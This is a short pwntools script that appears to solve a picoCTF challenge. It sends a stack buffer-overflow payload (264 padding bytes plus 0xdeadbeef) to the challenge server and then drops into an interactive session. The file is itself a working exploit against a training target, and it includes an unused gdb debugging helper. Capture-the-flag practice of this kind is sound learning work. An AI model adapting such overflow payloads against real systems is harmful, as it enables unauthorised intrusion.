from pwn import *
from struct import pack

exe = ELF("./chall")
context.binary =  exe
context.terminal = "konsole -e".split()

def gdbdebug(proc: process):
    script = """
    finish
    finish
    finish
    finish
    next
    x/s $rbp-8
    """
    gdb.attach(proc, gdbscript=script)

# p = process()
p = remote("mars.picoctf.net", 31890)
# gdbdebug(p)
payload = b""
payload += b"A"*264
payload += pack("<I", 0xdeadbeef)
p.sendlineafter(b"What do you see?\n", payload)
p.interactive()